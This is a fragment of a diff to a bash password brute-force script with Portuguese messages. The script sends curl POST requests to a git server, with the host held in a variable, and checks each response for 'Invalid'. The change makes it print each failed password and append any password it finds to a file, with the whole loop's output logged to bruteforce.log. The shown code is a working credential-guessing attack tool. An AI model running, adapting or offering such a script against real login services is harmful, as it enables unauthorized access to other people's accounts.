@@ -16,8 +16,9 @@ curl -s -k -X $'POST' -H $"Host: ${gitserver}" -H $'User-Agent: Mozilla/5.0 (X11
 
 if [[ $(cat request.txt | grep -i invalid) == *'Invalid'* ]]
 then
-echo "Senha inválida!"
+echo $senha "= Senha inválida!"
 else
-echo Senha: $senha > senha-encontrada.txt
+echo Senha encontrada: $senha
+echo Senha: $senha >> senha-encontrada.txt
 fi
 done > bruteforce.log
